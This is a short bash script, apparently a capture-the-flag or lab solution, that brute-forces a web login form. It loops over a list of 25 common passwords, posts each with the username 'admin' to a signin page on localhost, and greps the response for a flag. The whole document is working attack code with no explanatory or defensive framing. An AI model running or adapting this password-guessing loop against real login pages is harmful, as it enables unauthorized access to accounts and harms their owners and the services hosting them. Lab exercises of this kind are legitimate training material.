#!/bin/bash

password=(password 123456 12345678 qwerty abc123 monkey 1234567 letmein trustno1 dragon baseball 111111 iloveyou master sunshine ashley bailey passw0rd shadow 123123 654321 superman qazwsx michael Football )


for i in ${password[@]}; do
	curl -X POST "http://localhost:8080/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
done
